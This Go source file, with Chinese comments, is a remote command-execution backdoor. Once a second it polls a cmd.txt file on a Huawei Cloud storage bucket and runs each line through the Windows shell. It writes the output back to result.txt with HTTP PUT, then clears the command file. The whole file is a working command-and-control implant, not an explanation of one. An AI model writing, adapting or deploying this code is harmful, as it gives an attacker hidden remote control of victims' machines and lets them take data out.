package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

func main() {
	cmdURL := "https://=<name>.cn-south-1.myhuaweicloud.com/cmd.txt"
	resultURL := "https://<name>.cn-south-1.myhuaweicloud.com/result.txt"

	for {
		// 发起HTTP GET请求获取cmd.txt内容
		resp, err := http.Get(cmdURL)
		if err != nil {
			fmt.Printf("请求cmd.txt失败: %v\n", err)
			time.Sleep(1 * time.Second)
			continue
		}

		// 读取cmd.txt内容
		body, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("读取cmd.txt内容失败: %v\n", err)
			time.Sleep(1 * time.Second)
			continue
		}

		// 将响应内容按行分割
		commands := strings.Split(string(body), "\n")
		var results []string

		for _, cmd := range commands {
			cmd = strings.TrimSpace(cmd) // 去除空格和换行符
			if cmd == "" {
				continue // 跳过空行
			}

			// 执行系统命令
			fmt.Printf("执行命令: %s\n", cmd)
			output, err := exec.Command("cmd", "/c", cmd).CombinedOutput()
			if err != nil {
				fmt.Printf("执行命令出错: %v\n", err)
				results = append(results, fmt.Sprintf("命令: %s\n错误: %v", cmd, err))
			} else {
				results = append(results, fmt.Sprintf("命令: %s\n输出: %s\n", cmd, string(output)))
			}
		}

		// 发起HTTP GET请求获取result.txt内容
		resp1, err1 := http.Get(resultURL)
		if err1 != nil {
			fmt.Printf("请求result.txt失败: %v\n", err1)
			time.Sleep(1 * time.Second)
			continue
		}

		// 读取result.txt内容
		body1, err1 := ioutil.ReadAll(resp1.Body)
		resp1.Body.Close()
		if err != nil {
			fmt.Printf("读取result.txt内容失败: %v\n", err1)
			time.Sleep(1 * time.Second)
			continue
		}
		result := string(body1) + strings.Join(results, "\n")
		// 将执行结果写入result.txt
		putRequest(resultURL, result)

		if commands[0] != "" {
			// 将cmd.txt清空
			putRequest(cmdURL, "")
		}

		// 每秒钟请求一次
		time.Sleep(1 * time.Second)
	}
}

// 向指定URL发送PUT请求
func putRequest(url string, data string) {
	req, err := http.NewRequest(http.MethodPut, url, bytes.NewBuffer([]byte(data)))
	if err != nil {
		fmt.Printf("创建PUT请求失败: %v\n", err)
		return
	}

	// 设置请求的Content-Type
	req.Header.Set("Content-Type", "text/plain")

	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("发送PUT请求失败: %v\n", err)
		return
	}
	defer resp.Body.Close()

	// 输出响应状态码
	fmt.Printf("PUT请求响应状态码: %d\n", resp.StatusCode)
}
